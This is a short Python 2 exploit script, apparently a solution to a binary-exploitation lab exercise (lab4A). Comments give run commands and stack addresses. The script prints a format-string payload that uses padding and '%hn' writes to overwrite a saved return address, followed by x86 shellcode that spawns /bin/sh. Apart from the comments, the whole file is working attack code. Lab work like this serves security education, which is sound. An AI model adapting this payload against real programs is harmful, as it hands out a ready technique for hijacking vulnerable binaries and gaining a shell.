#! /usr/bin/env python

# cd /tmp/tdaddy/lab4A
# ./r.sh /levels/lab04/lab4A $(python /tmp/tdaddy/lab4a.py)

# $ra = 0xbffff5ec
RET_ADDL = '\x9c\xf6\xff\xbf'
RET_ADDH = '\x9e\xf6\xff\xbf'

SHELLCODE = "\x31\xC9\xF7\xE1\x51\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\xB0\x0b\x89\xE3\xCD\x80"

# argv = 0xbffff85f (GDB)
# argv = 0xbffff8fb (real)

print '\x90\xeb\x63BB' + RET_ADDL + "JUNK" + RET_ADDH + '%08x.' * 13 + '%63603x%hn%50950x%hn' + SHELLCODE
